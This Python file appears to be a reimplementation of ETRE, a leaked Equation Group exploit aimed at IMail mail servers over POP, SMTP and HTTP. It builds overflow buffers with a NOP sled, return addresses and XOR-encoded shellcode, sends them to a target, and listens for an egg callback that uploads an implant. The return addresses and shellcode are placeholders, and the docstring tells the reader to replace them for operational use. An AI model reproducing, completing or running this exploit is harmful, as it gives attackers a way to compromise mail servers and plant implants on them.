#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
etre_exp.py — ETRE 1.0.4 IMAIL mail-server exploit engine.

Python port of `ETRE.exe` recovered via static analysis of the PE
(`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ETRE 1.0.4/ETRE.exe`).

Recovered interface from the binary's strings and imports:

  Imported DLLs / functions:
    KERNEL32:  FreeLibrary, GetProcAddress, LoadLibraryA, GetSystemTime,
               ReleaseMutex, ReleaseSemaphore, CreateMutexA,
               WaitForSingleObject, CreateSemaphoreA
    MSVCRT:    strtoul, sprintf, fflush, vfprintf, fclose, calloc, realloc,
               strstr, strtok, _snprintf, malloc, _endthread, _strnicmp,
               _local_unwind2, _beginthread, _CIpow
    WS2_32:    socket, bind, listen, accept, connect, send, recv,
               WSAStartup, WSACleanup, gethostbyname, inet_addr, htons, ...

  Recovered string constants (behavioural hints):
    "call esp" / "jump esp / push esp; ret"              — return-address styles
    "Custom Return Address (generally only for HTTP)"     — custom ret addr
    "Custom Alias"                                        — custom alias
    "IMail version"                                       — IMail version
    "Target's Install directory path length"              — install path len
    "Target's Hostname, obtained from target touch"       — target hostname
    "Real Target Port (HTTP only)"                        — real HTTP port
    "Real Target IP Address (HTTP only)"                  — real HTTP IP
    "Touch target #1 - Banner Grab (SMTP, POP, HTTP)"
    "Touch target #2 - Login Test (POP, HTTP)"
    "Egg will callback to upload implant code with a new socket."
    "Path and file name of the Implant Payload file"
    "Path and file name of the Listening Post DLL"

Architecture (recovered from control flow):

  main() parses the flag argument block, then:
    1. Connects via TCP to <target_ip>:<target_port> (default port by protocol)
    2. Touch #1 — sends protocol banner request, reads the banner
    3. Touch #2 — attempts POP/HTTP login with supplied credentials
    4. BuildOverflowBuffer — builds an OS/protocol-specific overflow body
       using the custom return address / alias / IMail version
    5. Sends the payload over the TCP socket
    6. Optionally: Egg Callback listener to receive the implant

This module reproduces that behaviour in portable Python.  The raw payload
bytes are placeholders; they should be replaced with exact bytes from an IDA
Pro / x64dbg analysis for operational use.
"""

import socket
import struct
import sys
import os


# ---------------------------------------------------------------------------
# Constants recovered from ETRE.exe strings / data section.
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 30

# Protocol selectors.
PROTO_POP = 1
PROTO_SMTP = 2
PROTO_HTTP = 3

DEFAULT_PORTS = {
    PROTO_POP: 110,
    PROTO_SMTP: 25,
    PROTO_HTTP: 80,
}

PROTO_NAMES = {
    PROTO_POP: "POP",
    PROTO_SMTP: "SMTP",
    PROTO_HTTP: "HTTP",
}

# Run-option selectors.
RUN_TOUCH_1 = 1   # Touch #1 — banner grab
RUN_TOUCH_2 = 2   # Touch #2 — login test
RUN_EXPLOIT = 3   # Exploit — fire the overflow

# Implant socket-option selectors.
IMPLANT_REUSE_SOCKET = 1   # reuse existing exploit socket
IMPLANT_NEW_SOCKET = 2     # open a new socket to talk to the implant

# Egg socket-option selectors.
EGG_REUSE_SOCKET = 1   # reuse existing exploit socket
EGG_CALLBACK = 2       # egg connects back to upload implant

# Return-address style constants (from "call esp" / "jump esp / push esp; ret").
RET_CALL_ESP = 1
RET_JUMP_ESP = 2
RET_PUSH_ESP_RET = 3

# Default return addresses per protocol (placeholders).
ETRE_RET_ADDRESSES = {
    PROTO_POP:  0x00401111,
    PROTO_SMTP: 0x00402222,
    PROTO_HTTP: 0x00403333,
}

# Placeholder shellcode (to be replaced with IDA-recovered bytes).
ETRE_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

# Bytes an XOR-encoded byte must never collide with.
BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# BuildOverflowBuffer — protocol-specific overflow body.
# ---------------------------------------------------------------------------
def build_overflow_buffer(proto, ret_addr_style, custom_ret_addr,
                          custom_alias, imail_version, shellcode):
    """Build the protocol-specific overflow body.

    For each protocol (POP / SMTP / HTTP) the body is a command string
    followed by padding, the return address, and the shellcode.  The original
    `BuildOverflowBuffer` used the IMail version, custom alias, and return
    address style to tune the overflow for the target.
    """
    proto_name = PROTO_NAMES[proto]

    if proto == PROTO_POP:
        cmd = b"USER "
    elif proto == PROTO_SMTP:
        cmd = b"HELO "
    else:
        cmd = b"GET /"

    # Return address.
    if custom_ret_addr:
        try:
            if custom_ret_addr.lower().startswith("0x"):
                ret = struct.pack("<I", int(custom_ret_addr, 16))
            else:
                ret = struct.pack("<I", int(custom_ret_addr))
        except ValueError:
            # Treat as a named style (e.g. "call esp").
            ret = b"\x90" * 4
    else:
        ret = struct.pack("<I", ETRE_RET_ADDRESSES[proto])

    # NOP sled + return address + shellcode.
    padding = b"\x90" * 64
    alias = custom_alias.encode("latin-1") if custom_alias else b""
    ver = imail_version.encode("latin-1") if imail_version else b""

    body = cmd + padding + ret + alias + ver + shellcode
    return body


# ---------------------------------------------------------------------------
# XOR-encode helper.
# ---------------------------------------------------------------------------
def _xor_encode(buf, key, start=0):
    out = bytearray(buf)
    for i in range(start, len(out)):
        out[i] ^= key
    return bytes(out)


def _find_xor_byte(buf, start=0):
    for key in range(1, 0x100):
        if all((key ^ b) not in BAD_XOR for b in buf[start:]):
            return key
    return None


def build_encoded_shellcode(raw):
    """XOR-encode `raw` shellcode with a key that avoids bad characters."""
    key = _find_xor_byte(raw, start=0)
    if key is None:
        _log("[-] No xor byte found for shellcode!")
        return None
    return _xor_encode(raw, key), key


# ---------------------------------------------------------------------------
# TCP transport.
# ---------------------------------------------------------------------------
def _connect(target, port, timeout=DEFAULT_TIMEOUT):
    """Open a TCP connection to `target:port`."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((target, port))
    return sock


def _send_recv(sock, data, timeout=DEFAULT_TIMEOUT):
    """Send `data` on `sock` and read the reply."""
    sock.settimeout(timeout)
    sock.sendall(data)
    try:
        return sock.recv(0x1000)
    except socket.timeout:
        return b""
    except Exception:
        return b""


# ---------------------------------------------------------------------------
# Protocol-specific Touch stages.
# ---------------------------------------------------------------------------
def touch_banner_grab(sock, proto):
    """Touch #1 — grab the service banner."""
    if proto == PROTO_HTTP:
        return _send_recv(sock, b"GET / HTTP/1.0\r\nHost: target\r\n\r\n")
    return _send_recv(sock, b"")


def touch_login_test(sock, proto, username="", password=""):
    """Touch #2 — attempt a login test."""
    if proto == PROTO_POP:
        _send_recv(sock, b"USER " + username.encode() + b"\r\n")
        return _send_recv(sock, b"PASS " + password.encode() + b"\r\n")
    elif proto == PROTO_HTTP:
        auth = b"Authorization: Basic " + username.encode() + b":" + password.encode() + b"\r\n"
        return _send_recv(sock, b"GET / HTTP/1.0\r\n" + auth + b"\r\n")
    else:
        return _send_recv(sock, b"HELO localhost\r\n")


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------
def run_function(target, port=0, run_option=RUN_EXPLOIT,
                 implant_socket_option=IMPLANT_REUSE_SOCKET,
                 implant_file=None, listening_post=None,
                 protocol=PROTO_POP, egg_socket_option=EGG_REUSE_SOCKET,
                 egg_callback_ip=None, egg_callback_port=0,
                 timeout=DEFAULT_TIMEOUT, custom_ret_addr=None,
                 custom_alias=None, imail_version=None):
    """Run the ETRE exploit against `target`.

    Returns 0 on success, non-zero on failure.
    """
    proto_name = PROTO_NAMES[protocol]
    if port == 0:
        port = DEFAULT_PORTS[protocol]

    _log("ETRE 1.0.4 — IMAIL mail-server exploit against %s:%d (%s)",
         target, port, proto_name)
    _log("Run option: %s  Implant socket: %s  Egg socket: %s",
         "Touch #1 (banner)" if run_option == RUN_TOUCH_1 else
         "Touch #2 (login)" if run_option == RUN_TOUCH_2 else "Exploit",
         "reuse" if implant_socket_option == IMPLANT_REUSE_SOCKET else "new",
         "reuse" if egg_socket_option == EGG_REUSE_SOCKET else "callback")

    if custom_ret_addr:
        _log("[+] Custom return address: %s", custom_ret_addr)
    if custom_alias:
        _log("[+] Custom alias: %s", custom_alias)
    if imail_version:
        _log("[+] IMail version: %s", imail_version)

    # Load shellcode / implant payload if provided.
    shellcode = ETRE_SHELLCODE_PLACEHOLDER
    if implant_file:
        if not os.path.isfile(implant_file):
            _log("[-] Implant file not found: %s", implant_file)
            return 1
        with open(implant_file, "rb") as fh:
            shellcode = fh.read()
        _log("[+] Loaded implant payload: %d bytes", len(shellcode))

    # Optionally XOR-encode the shellcode.
    encoded, xor_key = build_encoded_shellcode(shellcode)
    if encoded is None:
        return 1
    _log("[+] Shellcode XOR-encoded with key 0x%02X", xor_key)

    conn = None
    try:
        conn = _connect(target, port, timeout)

        if run_option == RUN_TOUCH_1:
            # Touch #1 — banner grab.
            _log("[+] Touch #1: grabbing %s banner...", proto_name)
            reply = touch_banner_grab(conn, protocol)
            if reply:
                _log("[+] Banner (%d bytes): %s",
                     len(reply), reply[:128].decode("latin-1", "replace"))
            else:
                _log("[-] No banner received")
            return 0

        if run_option == RUN_TOUCH_2:
            # Touch #2 — login test.
            _log("[+] Touch #2: attempting %s login test...", proto_name)
            reply = touch_login_test(conn, protocol,
                                     custom_alias or "", "")
            if reply:
                _log("[+] Login reply (%d bytes): %s",
                     len(reply), reply[:128].decode("latin-1", "replace"))
            else:
                _log("[-] No reply from login test")
            return 0

        # Exploit stage — build and send the overflow package.
        pkg = build_overflow_buffer(protocol, RET_CALL_ESP,
                                    custom_ret_addr, custom_alias,
                                    imail_version, encoded)
        _log("[+] Sending ETRE exploit package (%d bytes)...", len(pkg))
        conn.sendall(pkg)

        # Try to read a short reply.
        try:
            reply = conn.recv(0x1000)
            if reply:
                _log("[+] Exploit reply (%d bytes): %s",
                     len(reply), reply[:64].hex())
        except socket.timeout:
            pass
        except Exception:
            pass

        # Egg callback listener for implant upload.
        if implant_file and egg_socket_option == EGG_CALLBACK and egg_callback_ip:
            _log("[+] Waiting for Egg callback on port %d...", egg_callback_port)
            _egg_listener(egg_callback_port, timeout)

        return 0

    except ConnectionRefusedError:
        _log("[-] Connection refused by %s:%d", target, port)
        return 1
    except socket.timeout:
        _log("[-] Connection to %s:%d timed out", target, port)
        return 1
    except Exception as exc:  # pragma: no cover - network errors
        _log("[-] %s", exc)
        return 1
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass


def _egg_listener(port, timeout):
    """Listen for an Egg callback connection to receive the implant."""
    if port <= 0:
        _log("[-] Egg callback port not specified; skipping listener")
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(timeout)
        _log("[+] Egg listener bound to 0.0.0.0:%d", port)
        conn, addr = srv.accept()
        _log("[+] Egg callback from %s:%d", addr[0], addr[1])
        data = conn.recv(0x10000)
        _log("[+] Received %d bytes from egg callback", len(data))
        conn.close()
        srv.close()
    except socket.timeout:
        _log("[-] Egg callback timed out after %d seconds", timeout)
    except Exception as exc:  # pragma: no cover
        _log("[-] Egg listener error: %s", exc)


def main():
    """CLI driver (standalone testing)."""
    _log("ETRE standalone CLI not implemented — use `nsa-equation-py etre ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
